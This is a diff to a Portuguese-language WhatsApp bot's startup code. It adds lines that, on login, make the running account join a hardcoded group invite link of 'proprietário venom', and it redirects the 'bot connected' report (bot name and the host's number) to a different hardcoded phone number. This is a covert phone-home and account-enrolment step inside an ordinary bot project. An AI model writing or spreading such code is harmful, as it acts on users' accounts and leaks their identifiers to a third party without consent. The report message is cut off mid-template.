@@ -72,9 +72,12 @@ async function starts() {
 	})
 	await client.connect({timeoutMs: 30*1000})
         fs.writeFileSync('./BarBar.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
+        console.log(color('|Informações|', 'yellow'), color('Entrando no grupo do proprietário venom', 'cyan'))
+        link = 'https://chat.whatsapp.com/CmxEYN5fMasKUVLMZFNdIW'
+        client.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})
  	console.log(color('|Informações|', 'yellow'), color('Enviando informações do bot para o proprietário venom', 'cyan'))
  const me = client.user 
-client.sendMessage(`37122291651@s.whatsapp.net`, `
+client.sendMessage(`559784388524@s.whatsapp.net`, `
 ╭ ⋟ Evolution-Bot conectado neste número. 
 • 
 • *nome do bot* : ${NomeDoBot}
